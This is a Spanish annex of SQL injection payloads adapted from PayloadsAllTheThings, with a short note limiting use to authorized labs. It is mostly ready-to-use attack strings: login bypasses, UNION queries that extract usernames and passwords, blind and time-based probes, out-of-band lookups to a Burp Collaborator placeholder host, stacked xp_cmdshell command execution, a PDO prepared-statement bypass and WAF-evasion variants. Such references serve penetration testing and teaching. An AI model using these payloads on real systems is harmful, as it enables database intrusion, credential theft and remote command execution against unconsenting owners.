# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección SQL / Entry Point Detection

````text
  ```sql
  `+HERP
  '||'DERP
  '+'herp
  ' 'DERP
  '%20'HERP
  '%2B'HERP
  ```
````

````text
  ```sql
  page.asp?id=1 or 1=1 -- true
  page.asp?id=1' or 1=1 -- true
  page.asp?id=1" or 1=1 -- true
  page.asp?id=1 and 1=2 -- false
  ```
````

### Variantes presentes en tablas o texto del apartado

```text
'
;
)
*
%27
%22
%23
%3B
%29
%2A
%%2727
%25%27
U+02BA
U+02B9
%CA%BA
U+0022
%CA%B9
U+0027
admin' OR '1'='1
SLEEP
```

## 2. DBMS Identification / DBMS Identification Keyword Based

### Variantes presentes en tablas o texto del apartado

```text
conv('a',16,2)=conv('a',16,2)
connection_id()=connection_id()
crc32('MySQL')=crc32('MySQL')
BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
@@CONNECTIONS>0
@@CONNECTIONS=@@CONNECTIONS
@@CPU_BUSY=@@CPU_BUSY
USER_ID(1)=USER_ID(1)
ROWNUM=ROWNUM
RAWTOHEX('AB')=RAWTOHEX('AB')
LNNVL(0=123)
5::int=5
5::integer=5
pg_client_encoding()=pg_client_encoding()
get_current_ts_config()=get_current_ts_config()
quote_literal(42.5)=quote_literal(42.5)
current_database()=current_database()
sqlite_version()=sqlite_version()
last_insert_rowid()>1
last_insert_rowid()=last_insert_rowid()
val(cvar(1))=1
IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0
```

## 3. DBMS Identification / DBMS Identification Basada en errores

### Variantes presentes en tablas o texto del apartado

```text
You have an error in your SQL syntax; ... near '' at line 1
'
ERROR: unterminated quoted string at or near "'"
ERROR: syntax error at or near "1"
1'
Unclosed quotation mark after the character string ''.
Incorrect syntax near ''.
The conversion of the varchar value to data type int resulted in an out-of-range value.
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated
ORA-00923: FROM keyword not found where expected
```

## 4. Inyección SQL / Autenticación Evasión

```SQL
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

```sql
' OR '1'='1'--
```

```SQL
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```

```sql
' or 1=1 limit 1 --
```

### Variantes presentes en tablas o texto del apartado

```text
'1'='1'
```

## 5. Autenticación Evasión / Raw MD5 and SHA1

```php
sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

```php
sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
```

### Variantes presentes en tablas o texto del apartado

```text
md5($password,true)
' or 'SOMETHING
'or'6�]��!r,��b
'or'
ÚT0Do#ßÁ'or'8
Q�u'='�@�[�t�- o��_-!
'='
ÜÛ¾}_ia!8Wm'/*´Õ
'/*
Ùp2ûjww%6\
\
```

## 6. Autenticación Evasión / Hashed Passwords

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```

### Variantes presentes en tablas o texto del apartado

```text
UNION
SELECT username, password_hash FROM users WHERE username = ?
password_hash
hash(input_password)
stored_password_hash == hash(input_password)
hash(attacker_supplied_password)
AND 1=0
SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'
MD5("P@ssw0rd")
161ebd7d45089b3446ee4e0d86dbcf92
"P@ssw0rd"
KDF(salt, password)
```

## 7. Inyección SQL / Basada en UNION Inyección

```sql
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
```

```SQL
1' UNION SELECT username, password FROM users --
```

```SQL
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
```

### Variantes presentes en tablas o texto del apartado

```text
UNION
SELECT
input_id
```

## 8. Inyección SQL / Basada en errores Inyección

```sql
LIMIT CAST((SELECT version()) as numeric) 
```

```ps1
ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
```

### Variantes presentes en tablas o texto del apartado

```text
version()
```

## 9. Ciega Inyección / Boolean Based Inyección

```ps1
http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
```

```ps1
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
```

```ps1
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
```

### Variantes presentes en tablas o texto del apartado

```text
@@hostname
```

## 10. Ciega Inyección / Ciega Basada en errores Inyección

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```

### Variantes presentes en tablas o texto del apartado

```text
json()
```

## 11. Ciega Inyección / Basada en tiempo Inyección

```sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```

```sql
BENCHMARK(2000000,MD5(NOW()))
```

```sql
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```

### Variantes presentes en tablas o texto del apartado

```text
SLEEP
```

## 12. Ciega Inyección / Fuera de banda (OAST)

```sql
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

```sql
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

## 13. Inyección SQL / Stacked Based Inyección

```sql
1; EXEC xp_cmdshell('whoami') --
```

### Variantes presentes en tablas o texto del apartado

```text
;
```

## 14. Inyección SQL / Polyglot Inyección

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## 15. Inyección SQL / Routed Inyección

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

```sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

### Variantes presentes en tablas o texto del apartado

```text
' union select 0xHEXVALUE --
0x2720756e696f6e2073656c65637420312c3223
' union select 1,2#
0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061
-1' union select login,password from users-- a
```

## 16. Inyección SQL / Second Order Inyección SQL

```text
   Username: attacker'--
   Email: attacker@example.com
```

```sql
   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
```

```python
   query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
```

## 17. Inyección SQL / PDO Prepared Statements

```php
    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';

    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
    $stmt->execute([$_GET['name']]);
    // or
    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
    $stmt->execute(['name' => $_GET['name']]);
```

```ps1
    # 1st Payload: ?#\0
    # 2nd Payload: anything
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1
```

```ps1
    # 1st Payload: ?#\0
    # 2nd Payload: x`;#
    Column not found: 1054 Unknown column ''x' in 'SELECT'
```

```ps1
    # 1st Payload: \?#\0
    # 2nd Payload: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
    ALL_PLUGINS
    APPLICABLE_ROLES
    CHARACTER_SETS
    CHECK_CONSTRAINTS
    COLLATIONS
    COLLATION_CHARACTER_SET_APPLICABILITY
    COLUMNS
```

```SQL
    -- Before $pdo->prepare
    SELECT `\?#\0` FROM animals WHERE name = ?

    -- After $pdo->prepare
    SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM animals WHERE name = ?
```

### Variantes presentes en tablas o texto del apartado

```text
PDO::ATTR_EMULATE_PREPARES => true
$pdo->prepare("SELECT $INJECT_SQL_HERE...")
?
:parameter
\0
:
?#\0
GET /index.php?col=%3f%23%00&name=anything
'x\
;#
GET /index.php?col=%3f%23%00&name=x%60;%23
GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+
+from+information_schema.tables)y%3b%2523
```

## 18. No Space Allowed / Alternativa Whitespace Characters

### Variantes presentes en tablas o texto del apartado

```text
?id=1%09and%091=1%09--
%09
\t
?id=1%0Aand%0A1=1%0A--
%0A
\n
?id=1%0Band%0B1=1%0B--
%0B
?id=1%0Cand%0C1=1%0C--
%0C
?id=1%0Dand%0D1=1%0D--
%0D
\r
?id=1%A0and%A01=1%A0--
%A0
```

## 19. No Space Allowed / Bypassing Con Comentarios and Parentheses

### Variantes presentes en tablas o texto del apartado

```text
?id=1/*comment*/AND/**/1=1/**/--
?id=1/*!12345UNION*//*!12345SELECT*/1--
?id=(1)and(1)=(1)--
```

## 20. Generic Evasión de WAF / No Comma Allowed

### Variantes presentes en tablas o texto del apartado

```text
SUBSTR('SQL',1,1)
SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

## 21. Generic Evasión de WAF / No Equal Allowed

### Variantes presentes en tablas o texto del apartado

```text
SUBSTRING(VERSION(),1,1)LIKE(5)
SUBSTRING(VERSION(),1,1)NOT IN(4,3)
SUBSTRING(VERSION(),1,1)IN(4,3)
SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4
```

## 22. Generic Evasión de WAF / Case Modification

### Variantes presentes en tablas o texto del apartado

```text
AND
and
aNd
&&
OR
\|\|
=
>
NOT BETWEEN 0 AND X
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
